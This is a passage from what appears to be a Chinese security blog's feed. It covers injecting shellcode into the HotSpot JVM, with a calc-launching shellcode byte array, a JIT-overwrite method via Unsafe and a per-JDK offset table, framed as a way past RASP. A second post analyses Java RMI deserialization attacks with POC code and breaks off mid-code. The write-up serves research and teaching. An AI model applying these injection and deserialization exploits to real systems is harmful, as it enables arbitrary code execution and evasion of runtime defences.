class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x12</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x57</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8B</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6F</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x87</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBB</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xF0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xB5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xA2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xA6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x95</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBD</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x9D</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xC4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x28</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x06</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7C</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFB</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xE0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x05</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xBB</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x47</span>,</span><br><span class="line">                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x13</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6F</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6A</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xDA</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xFF</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xD5</span></span><br><span class="line">            &#125;;</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            byteArrayOutputStream.write(buf);</span><br><span class="line">            byteArrayOutputStream.write(<span class="hljs-string">"calc\0"</span>.getBytes());</span><br><span class="line">            <span class="hljs-keyword">byte</span>[] result = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">            Method method = clazz.getDeclaredMethod(<span class="hljs-string">"run"</span>, <span class="hljs-keyword">byte</span>[].class);</span><br><span class="line">            method.invoke(clazz, result);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(bytes, <span class="hljs-number">0</span>, bytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> sun.tools.attach;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WindowsVirtualMachine</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WindowsVirtualMachine</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">enqueue</span><span class="hljs-params">(<span class="hljs-keyword">long</span> var0, <span class="hljs-keyword">byte</span>[] var2, String var3, String var4, Object... var5)</span> <span class="hljs-keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">long</span> <span class="hljs-title">openProcess</span><span class="hljs-params">(<span class="hljs-keyword">int</span> var0)</span> <span class="hljs-keyword">throws</span> IOException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] buf)</span> </span>&#123;</span><br><span class="line">        System.loadLibrary(<span class="hljs-string">"attach"</span>);</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            enqueue(-<span class="hljs-number">1L</span>, buf, <span class="hljs-string">"test"</span>, <span class="hljs-string">"test"</span>);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于oop偏移"><a href="#基于oop偏移" class="headerlink" title="基于oop偏移"></a>基于oop偏移</h2><p>这种是基于@Ryan Wincey和@xxDark两位前辈的总结，基本原理是：多次调用某个方法，使其成为热点代码触发即时编译，然后通过oop的数据结构偏移计算出JIT地址，最后使用Unsafe写内存的功能，将shellcode写入到JIT地址。其中涉及Unsafe、Oop-Klass模型和即时编译这三个前置知识。</p><h3 id="Unsafe类"><a href="#Unsafe类" class="headerlink" title="Unsafe类"></a>Unsafe类</h3><p><code>Unsafe</code>类是java中非常特别的一个类，提供的操作可以直接读写内存、获得地址偏移值、锁定或释放线程。<code>Unsafe</code>只有一个私有的构造方法，但在类加载时候在静态代码中会实例化一个<code>Unsafe</code>对象，赋值给<code>Unsafe</code>类的静态常量<code>Unsafe</code>属性，我们反射获取到这个<code>Unsafe</code>属性即可。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field field = Unsafe.class.getDeclaredField(<span class="hljs-string">"theUnsafe"</span>);</span><br><span class="line">field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">Unsafe unsafe = (Unsafe) field.get(<span class="hljs-keyword">null</span>);</span><br></pre></td></tr></table></figure><p><code>Unsafe</code>读写内存的相关方法有<code>getObject</code>、<code>getAddress</code>、<code>getInt</code>、<code>getLong</code>和<code>putByte</code>等。</p><h3 id="Oop-Klass模型"><a href="#Oop-Klass模型" class="headerlink" title="Oop-Klass模型"></a>Oop-Klass模型</h3><p>HotSpot JVM 底层都是 C/C++ 实现的，Java 对象在JVM的表示模型叫做“OOP-Klass”模型，包括两部分：</p><ul><li><p>OOP，即 Ordinary Object Point，普通对象指针，用来描述对象实例信息。</p></li><li><p>Klass，用来描述 Java 类，包含了元数据和方法信息等。</p></li></ul><p>在Java程序运行过程中，每创建一个新的对象，在JVM内部就会相应地创建一个对应类型的OOP对象。Java类是对象，Java方法也是对象，而Java类加载完成时在JVM中的最终产物就是InstanceKlass，其中包含方法信息、字段信息等一切java 类所定义的一切元素。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220315162807364.jpg" alt></p><h3 id="即时编译（JIT）"><a href="#即时编译（JIT）" class="headerlink" title="即时编译（JIT）"></a>即时编译（JIT）</h3><blockquote><p> 为了优化Java的性能 ，JVM在解释器之外引入了即时（Just In Time）编译器：当程序运行时，解释器首先发挥作用，代码可以直接执行；当方法或者代码块在一段时间内的调用次数超过了JVM设定的阈值时，这些字节码就会被编译成机器码，存入codeCache中。在下次执行时，再遇到这段代码，就会从codeCache中读取机器码，直接执行，以此来提升程序运行的性能。整体的执行过程大致如下图所示：</p></blockquote><p><img src="/2022/03/22/JVM_Shellcode注入探索/ba83857ecf9f344e4972fd551c4973d653952.png" alt></p><p>Openjdk和Oracle JDK在默认mixed模式下会启动即时编译，即时编译的触发阈值在客户端编译器和服务端编译器上默认值分别为1500和10000。</p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>在JVM的本体：jvm.dll和libjvm.so中，存在这一个<a href="https://github.com/openjdk/jdk/blob/0af356bb4bfee99223d4bd4f8b0001c5f362c150/src/hotspot/share/runtime/vmStructs.cpp" target="_blank" rel="noopener">VMStructs</a>的类，存储了JVM中包括oop、klass、constantPool在内的数据结构和他的属性。其中有使用<code>JNIEXPORT</code>标记的<code>VMStructs</code>、<code>VMTypes</code>、<code>IntConstants</code>和<code>LongConstants</code>的入口、名称、地址等偏移的变量，借助<code>ClassLoader</code>的内部类<code>NativeLibrary</code>的<code>find</code>或<code>findEntry</code>Native方法（与JDK的版本有关）,可获取到这些变量的值。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220315195440905.jpg" alt></p><p>然后通过<code>InstanceKlass</code>、<code>Array&lt;Method*&gt;</code>、<code>Method</code>、<code>ConstMethod</code>、<code>ConstantPool</code>、<code>Symbol</code>这些oop数据结构中的变量偏移计算出JIT的地址。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/mermaid-diagram-20220322234434.png" alt></p><p>我们要计算出的目标JIT地址是目标方法的JIT地址，这需要目标方法经多次调用触发即时编译，并自动赋值<code>_from_compiled_entry</code>结构成员，然后对比方法名和Signature，从目标类众多默认方法中过滤出目标方法来，再通过<code>Method</code>加上<code>_from_compiled_entry</code>偏移计算出来。（这里的Signature即形如<code>()V</code>、<code>(Ljava/lang/String;)V</code>、<code>()Ljava/lang/String;</code>的方法签名）</p><p>上图没有提到<code>InstanceKlass</code>的获取，其实只要通过<code>Target.class</code>获取到目标类的类实例，再用Unsafe读取类实例加上<code>java_lang_Class</code>的<code>klass</code>偏移即可。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316105040869.jpg" alt></p><p>JVM的JIT在内存中是一个可读可写可执行的区域，最后使用<code>Unsafe</code>的<code>putByte</code>方法写入shellcode，再调用目标方法即可执行。这里要注意的是，如果使用没有恢复现场，即破坏了原有栈帧的shellcode，<strong>会导致JVM奔溃，切勿在生产环境上测试</strong>。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220315205923708.jpg" alt></p><p>以上的Demo代码可以@xxDark的<a href="https://github.com/xxDark/JavaShellcodeInjector" target="_blank" rel="noopener"> JavaShellcodeInjector</a>项目中浏览。</p><h3 id="部分问题修复及改进"><a href="#部分问题修复及改进" class="headerlink" title="部分问题修复及改进"></a>部分问题修复及改进</h3><p>在32位的JDK跑Demo，JRE会抛出个异常，调试发现从目标类实例获取<code>InstanceKlass</code>的偏移：klassOffset，从内存取到的值是0，使得获取到的<code>klass</code>不正确，导致Unsafe读取了一个异常的地址。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316102851189.jpg" alt></p><p>问题的原因目前还不得而知，但通过HSDB找到<code>java.lang.Class</code>的<code>InstanceKlass</code>就可以看到<code>klass</code>的偏移，后续其他自动获取的偏移也没有出现异常。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316103424323.jpg" alt></p><p>上面自动化地计算偏移，要加载JVM的链接库，还要获取一堆JVM里的数据结构、记录一堆oop和常量池的值，这要是想将POC写成一个文件着实有点不方便啊。那有没有一种简单粗暴的方法呢？</p><p>答案是肯定的。笔者刚好装有多个版本的JDK，发现JDK大版本和位数相同的时候，上面那些偏移是不变的。翻看JDK的源码不难发现，这些offset归根结底是由<code>offset_of</code>宏得出，一个与C语言<code>offsetof</code>作用相同的宏，结果是一个结构成员相对于结构开头的字节偏移量。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316112536664.jpg" alt></p><p>而通过之前查阅的资料得知，不同JDK大版本之间的oop数据结构才存在差异，我们只要记录下这些相同架构和大版本的偏移，就能直接计算出JIT的地址，可以免去加载JVM链接库和收集、存储JVM里数据结构的操作。</p><p>以下是笔者收集的部分LTS版本JDK的oop相关偏移：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//        JDK8 x32</span><br><span class="line">static int klassOffset = 0x44;</span><br><span class="line">static int methodArrayOffset = 0xe4;</span><br><span class="line">static int methodsOffset = 0x4;</span><br><span class="line">static int constMethodOffset = 0x4;</span><br><span class="line">static int constantPoolTypeSize = 0x2c;</span><br><span class="line">static int constantPoolOffset = 0x8;</span><br><span class="line">static int nameIndexOffset = 0x1a;</span><br><span class="line">static int signatureIndexOffset = 0x1c;</span><br><span class="line">static int _from_compiled_entry = 0x24;</span><br><span class="line">static int symbolTypeBodyOffset = 0x8;</span><br><span class="line">static int symbolTypeLengthOffset = 0x0;</span><br><span class="line"></span><br><span class="line">//        JDK8 x64</span><br><span class="line">static int klassOffset = 0x48;</span><br><span class="line">static int methodArrayOffset = 0x180;</span><br><span class="line">static int methodsOffset = 0x8;</span><br><span class="line">static int constMethodOffset = 0x8;</span><br><span class="line">static int constantPoolTypeSize = 0x50;</span><br><span class="line">static int constantPoolOffset = 0x8;</span><br><span class="line">static int nameIndexOffset = 0x22;</span><br><span class="line">static int signatureIndexOffset = 0x24;</span><br><span class="line">static int _from_compiled_entry = 0x40;</span><br><span class="line">static int symbolTypeBodyOffset = 0x8;</span><br><span class="line">static int symbolTypeLengthOffset = 0x0;</span><br><span class="line"></span><br><span class="line">//        JDK11 x64</span><br><span class="line">static int klassOffset = 0x50;</span><br><span class="line">static int methodArrayOffset = 0x198;</span><br><span class="line">static int methodsOffset = 0x8;</span><br><span class="line">static int constMethodOffset = 0x8;</span><br><span class="line">static int constantPoolTypeSize = 0x40;</span><br><span class="line">static int constantPoolOffset = 0x8;</span><br><span class="line">static int nameIndexOffset = 0x2a;</span><br><span class="line">static int signatureIndexOffset = 0x2c;</span><br><span class="line">static int _from_compiled_entry = 0x38;</span><br><span class="line">static int symbolTypeBodyOffset = 0x6;</span><br><span class="line">static int symbolTypeLengthOffset = 0x0;</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>笔者在JDK7也曾尝试注入shellcode，但最后还是以失败告终，不仅是因为JDK7到JDK8的oop数据结构发生了很大的变化，而且JDK7中的类示例中并没有<code>InstanceKlass</code>结构成员，但<code>java_lang_CLass</code>中又确确实实存在<code>_klass_offset</code>这个结构成员，这点就比较奇怪。</p><p><img src="/2022/03/22/JVM_Shellcode注入探索/截图20220316120624000.jpg" alt></p><p>翻看官方工具HSDB源码，发现它是通过<code>BasicHashtable&lt;mtInternal&gt;</code>的<code>_buckets</code>结构成员获取所有<code>InstanceKlass</code>的。由于JDK7上POC的oop数据结构需要改动较多，且还不知道<code>BasicHashtable&lt;mtInternal&gt;</code>要怎么获取，所以JDK7下的POC还未实现。</p><p>最后两个的shellcode注入方法基于Oracle JDK和Openjdk的默认JVM：HotSpot，其他一些的JVM的实现方法就要静待各位师傅发掘。</p><p>文中若有错误的地方，望各位师傅不吝斧正。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/10075" target="_blank" rel="noopener">https://xz.aliyun.com/t/10075</a></p><p><a href="https://www.slideshare.net/RyanWincey/java-shellcodeoffice" target="_blank" rel="noopener">https://www.slideshare.net/RyanWincey/java-shellcodeoffice</a></p><p><a href="https://github.com/xxDark/JavaShellcodeInjector/blob/master/src/main/java/me/xdark/shell/ShellcodeRunner.java" target="_blank" rel="noopener">https://github.com/xxDark/JavaShellcodeInjector/blob/master/src/main/java/me/xdark/shell/ShellcodeRunner.java</a></p><p><a href="https://qiankunli.github.io/2014/10/27/jvm_classloader.html" target="_blank" rel="noopener">https://qiankunli.github.io/2014/10/27/jvm_classloader.html</a></p><p><a href="https://www.sczyh30.com/posts/Java/jvm-klass-oop/" target="_blank" rel="noopener">https://www.sczyh30.com/posts/Java/jvm-klass-oop/</a></p><p><a href="https://jishuin.proginn.com/p/763bfbd58ef3" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd58ef3</a></p><p><a href="https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html" target="_blank" rel="noopener">https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着RASP技术的发展，普通webshell已经很难有用武之地，甚至是各种内存马也逐渐捉襟见肘。秉承着《&lt;a href=&quot;https://www.anquanke.com/post/id/214435&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;JSP Webshell那些事——攻击篇（上）&lt;/a&gt;》中向下走的思路，存不存在一种在Java代码中执行机器码的方法呢？答案是肯定的，常见的注入方式有JNI、JNA和利用JDK自带的Native方法等，其中笔者还找到了一种鲜有文章介绍的，基于HotSpot虚拟机，且较为通用的注入方法。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="JVM" scheme="http://127.0.0.1/tags/JVM/"/>
    
    <category term="HotSpot" scheme="http://127.0.0.1/tags/HotSpot/"/>
    
    <category term="shellcode" scheme="http://127.0.0.1/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI攻击分析与总结</title>
    <link href="http://127.0.0.1/2022/02/16/Java_RMI%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
    <id>http://127.0.0.1/2022/02/16/Java_RMI%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/</id>
    <published>2022-02-16T12:42:53.000Z</published>
    <updated>2022-02-16T12:43:23.064Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h2><p><strong>Java远程方法调用</strong>，即<strong>Java RMI</strong>（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。它是由注册中心、服务端和客户端三部分组成。</p><ul><li><p>注册中心</p><p>作为存储远程方法的代理对象的仓库。</p></li><li><p>服务端</p><p>暴露远程对象，并将其代理对象注册进 RMI Registry。一个代理对象在服务端中包含一个skeleton对象，用于接受来自stub对象的调用。</p></li><li><p>客户端</p><p>查找远程代理对象，远程调用服务对象。一个代理对象在调用该远程对象的客户端上包含一个stub对象，负责调用参数和返回值的序列化、打包解包，以及网络层的通讯过程。</p></li></ul><a id="more"></a><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>RMI的各种攻击方式本质上是利用对象传输过程中反序列化实现的，以下是几种常见的攻击方式。</p><h3 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h3><p>当服务端向注册中心注册时，注册中心会反序列化服务端绑定的对象，具体体现在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>。当服务端注册绑定的是一个恶意的对象时，就可造成反序列化漏洞。当然，由于绑定的对象需要时<code>Remote</code>对象，所以恶意对象需要实现使用代理类或改写注册方法才能注册绑定。</p><p>在远程方法实例化的过程中，调用的父类<code>java.rmi.server.UnicastRemoteObject</code>的构造方法，最终是调用了<code>sun.rmi.server.Util#createProxy</code>方法创建<code>Remote</code>的动态代理类对象并返回。</p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 115251.png" alt></p><p><img src="/2022/02/16/Java_RMI攻击分析与总结/屏幕截图 2022-02-15 115940.png" alt></p><p>POC中的动态代理类按照<code>createProxy</code>方法中逻辑写即可，其中<code>InvocationHandler</code>子类通常选择<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，它具有<code>Map&lt;String, Object&gt;</code>类型的属性<code>memberValues</code>可以很方便的绑定反序列化的恶意对象。</p><p>最终POC如下：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map.put(<span class="hljs-string">"obj"</span>, evilObject());</span><br><span class="line"></span><br><span class="line">InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);</span><br><span class="line">Remote remoteObj = (Remote) Proxy.newProxyInstance(</span><br><span class="line">    Remote.class.getClassLoader(),</span><br><span class="line">    <span class="hljs-keyword">new</span> Class[]&#123;Remote.class&#125;,</span><br><span class="line">    invocationHandler</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">1009</span>);</span><br><span class="line">registry.bind(<span class="hljs-string">"AttackRegistry"</span>, remoteObj);</span><br></pre></td></tr></table></figure><h3 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h3><h4 id="反序列化参数"><a href="#反序列化参数" class="headerlink" title="反序列化参数"></a>反序列化参数</h4><p>攻击服务端其中一种方法是通过反序列化远程方法参数实现的。服务端反序列化参数体现在<code>sun.rmi.server.UnicastServerRef#dispatch</code>方法里调用的<code>unmarshalParameters</code>方法，最终通过<code>sun.rmi.server.UnicastRef#unmarshalValue</code>方法反序列化非基本类型的参数。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unmarshalValue</span><span class="hljs-params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化参数的利用POC比较简单，但需要服务端以<code>Object</code>未参数的远程方法，Demo如下：</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 接口</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IRemoteMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> IRemoteMethod <span class="hljs-title">exploit</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 实现类</span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RemoteMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IRemoteMethod</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">RemoteMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException 